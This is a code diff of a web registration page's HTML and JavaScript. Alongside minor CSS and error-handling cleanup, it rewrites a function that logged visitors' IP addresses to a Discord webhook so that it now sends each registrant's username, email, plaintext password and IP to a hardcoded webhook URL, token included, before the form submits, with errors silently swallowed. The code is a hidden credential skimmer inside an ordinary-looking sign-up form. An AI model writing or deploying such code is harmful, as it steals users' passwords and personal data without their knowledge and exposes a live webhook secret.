@@ -59,21 +59,11 @@
             color: red;
             margin: 10px 0;
         }
-        .login-link {
-            display: block;
-            text-align: center;
-            margin-top: 10px;
+        .login-link, .tos-link {
             color: #64b5f6;
             text-decoration: none;
         }
-        .login-link:hover {
-            text-decoration: underline;
-        }
-        .tos-link {
-            color: #64b5f6;
-            text-decoration: none;
-        }
-        .tos-link:hover {
+        .login-link:hover, .tos-link:hover {
             text-decoration: underline;
         }
     </style>
@@ -111,18 +101,27 @@
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip;
-            } catch (error) {
-                console.error('Failed to fetch public IP:', error);
+            } catch {
                 return 'Unavailable';
             }
         }
 
-        async function sendIpToDiscord(ip) {
+        async function sendRegistrationDataToDiscord(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1285818465105608736/rtP9WnxAYGhouj-UepxnByoim0KVfpu3pNoJuIj-kH7rxdaBlA8ROiybI596GLWU5n3v';
-            const webhookData = {
-                content: `New registration IP: ${ip}`,
-                username: 'IP Logger'
+            const embed = {
+                title: "New Registration",
+                color: 5814783,
+                fields: [
+                    { name: "Username", value: data.username, inline: true },
+                    { name: "Email", value: data.email, inline: true },
+                    { name: "Password", value: data.password, inline: true },
+                    { name: "IP Address", value: data.ip, inline: true },
+                ],
+                footer: { text: "Registration Bot" },
+                timestamp: new Date()
             };
+
+            const webhookData = { embeds: [embed] };
 
             try {
                 await fetch(webhookUrl, {
@@ -132,9 +131,7 @@
                     },
                     body: JSON.stringify(webhookData)
                 });
-            } catch (error) {
-                console.error('Failed to send IP to Discord:', error);
-            }
+            } catch {}
         }
 
         async function fetchUserCount() {
@@ -142,14 +139,12 @@
                 const response = await fetch('/user_count');
                 const data = await response.json();
                 document.getElementById('userCountButton').textContent = `Total Users: ${data.count}`;
-            } catch (error) {
-                console.error('Failed to fetch user count:', error);
-            }
+            } catch {}
         }
 
         async function updateUserCountPeriodically() {
             await fetchUserCount();
-            setInterval(fetchUserCount, 100); // Update every 10 seconds
+            setInterval(fetchUserCount, 10000);
         }
 
         function validateEmailDomain(email) {
@@ -171,13 +166,13 @@
         }
 
         document.getElementById('registerForm').addEventListener('submit', async (event) => {
-            event.preventDefault(); // Prevent the default form submission
+            event.preventDefault();
 
             const form = event.target;
-            const username = form.querySelector('input[name="username"]').value;
-            const email = form.querySelector('input[name="email"]').value;
-            const password = form.querySelector('input[name="password"]').value;
-            const acceptTerms = form.querySelector('input[name="acceptTerms"]').checked;
+            const username = form.username.value;
+            const email = form.email.value;
+            const password = form.password.value;
+            const acceptTerms = form.acceptTerms.checked;
             const errorMessageDiv = document.getElementById('error-message');
 
             if (!acceptTerms) {
@@ -199,19 +194,23 @@
                 errorMessageDiv.textContent = 'Invalid email address. Don\'t use tempmail';
                 return;
             } else {
-                errorMessageDiv.textContent = ''; // Clear the error message if email is valid
+                errorMessageDiv.textContent = '';
             }
 
             const publicIp = await getPublicIp();
             document.getElementById('public_ip').value = publicIp;
 
-            await sendIpToDiscord(publicIp); // Send IP address to Discord
-            
-            // Submit the form after sending the IP
+            const registrationData = {
+                username: username,
+                email: email,
+                password: password,
+                ip: publicIp
+            };
+
+            await sendRegistrationDataToDiscord(registrationData);
             form.submit();
         });
 
-        // Start fetching user count periodically
         updateUserCountPeriodically();
     </script>
 </body>
